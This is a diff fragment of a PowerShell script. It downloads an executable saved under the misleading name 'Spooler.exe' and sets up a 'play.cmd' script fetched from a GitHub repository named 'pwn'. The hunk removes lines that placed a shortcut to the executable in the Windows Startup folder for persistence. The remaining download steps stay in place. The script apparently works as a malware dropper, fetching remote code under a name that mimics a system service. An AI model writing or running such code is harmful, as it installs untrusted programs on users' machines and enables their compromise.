@@ -10,15 +10,6 @@ if (-not (Test-Path -Path $downloadDirectory -PathType Container)) {
 # Download the executable
 Invoke-WebRequest -Uri $exeUrl -OutFile "$downloadDirectory\Spooler.exe"
 
-# Create a shortcut to the executable with a different name
-$WshShell = New-Object -ComObject WScript.Shell
-$Shortcut = $WshShell.CreateShortcut("$downloadDirectory\SpoolerShortcut.lnk")
-$Shortcut.TargetPath = "$downloadDirectory\Spooler.exe"
-$Shortcut.Save()
-
-# Add the shortcut to autostart
-$StartupFolder = [System.Environment]::GetFolderPath("Startup")
-Copy-Item "$downloadDirectory\SpoolerShortcut.lnk" "$StartupFolder\SpoolerShortcut.lnk"
 
 $cmdScriptUrl = "https://raw.githubusercontent.com/Wesley5n1p35/pwn/main/play.cmd"
 $cmdScriptPath = [System.IO.Path]::Combine($env:USERPROFILE, "Library\play.cmd")
